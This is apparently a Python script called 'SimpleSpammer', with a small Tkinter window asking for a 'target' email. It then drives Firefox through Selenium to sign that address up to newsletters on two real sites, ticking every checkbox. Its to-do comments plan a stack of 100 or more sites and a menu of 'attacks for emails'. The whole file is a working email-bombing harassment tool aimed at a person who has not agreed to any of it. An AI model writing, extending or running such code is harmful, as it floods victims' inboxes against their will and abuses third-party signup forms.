# Python is installed, Selenium is installed, Firefox GeckoDriver Webdriver is installed and moved to /usr/local/bin
# https://github.com/ennouri0maak/forredditors/blob/main/779.py

# To-Do:
#   * Polish GUI up
#   * Add way to submit website via GUI
#   * Add 100 sites minimum stack of sites.
#   * Build data structure for storing websites
#   * Add way to choose between different attacks for emails.

import time
from tkinter import messagebox
from selenium import webdriver
import webbrowser
import selenium
from tkinter import *
from tkinter import ttk
from selenium.webdriver.common.by import By

# GUI Initialization

ws = Tk()
ws.title("SimpleSpammer")
ws.geometry('800x800')
########


# Content Frame

mainframe = ttk.Frame(ws, padding="3 3 12 12")
mainframe.grid(column=0, row=0, sticky=(N, W, E, S))
ws.columnconfigure(0, weight=1)
ws.rowconfigure(0, weight=1)

ttk.Label(mainframe, text="SimpleSpammer").grid(column=2, row=1, sticky=E)


def submitEntry():

    # Ideally I want the line: TARGET = targetemail.get() to be on this page. Fix it so it works here.

    POOP = targetemail.get()
    messagebox.showinfo('SimpleSpammer', f'{POOP}, will now be targeted.')
    ws.destroy()


ttk.Button(mainframe, text="Submit Request",
           command=submitEntry).grid(column=2, row=3, sticky=E)
ttk.Label(mainframe, text="Enter Target Email: ").grid(
    column=1, row=2, sticky=W)
for child in mainframe.winfo_children():
    child.grid_configure(padx=5, pady=5)
########

# Entry Widget
targetemail = StringVar()
targetemail_entry = ttk.Entry(mainframe, width=20, textvariable=targetemail)
targetemail_entry.grid(column=2, row=2)
########


ws.mainloop()


# WebDriver Initialization
driver = webdriver.Firefox()
########

# Site #1
driver.get('https://www.nbc26.com/account/manage-email-preferences')
driver.refresh()
TARGET = targetemail.get()
user_input = driver.find_element_by_id('id_email')
user_input.send_keys(TARGET)
driver.find_element(By.ID, "8dd3e567-62dc-4aca-bc0c-9650de13aad4").click()
driver.find_element(By.ID, "edac06c6-aa98-4904-98db-400d1d5fae99").click()
driver.find_element(By.ID, "81e98b4e-4158-4760-9031-9c2d9e50b666").click()
driver.find_element(By.ID, "a53cc146-456f-4b57-b0dd-d10956a79963").click()
driver.find_element(By.CSS_SELECTOR, ".btn--primary").click()
driver.close()
########

# Site #2
driver = webdriver.Firefox()

driver.get('https://www.crosswalk.com/newsletters/')

driver.refresh()

user_input = driver.find_element_by_class_name('emailAddress')
user_input.send_keys(TARGET)

elements = driver.find_elements_by_xpath("//*[@type='checkbox']")

for element in elements:
    if element.is_selected():
        print("Already Selected")
    else:
        element.click()

driver.find_element(
    By.CSS_SELECTOR, ".SubscribeBox:nth-child(1) > .SubmitButton").click()

driver.close()
########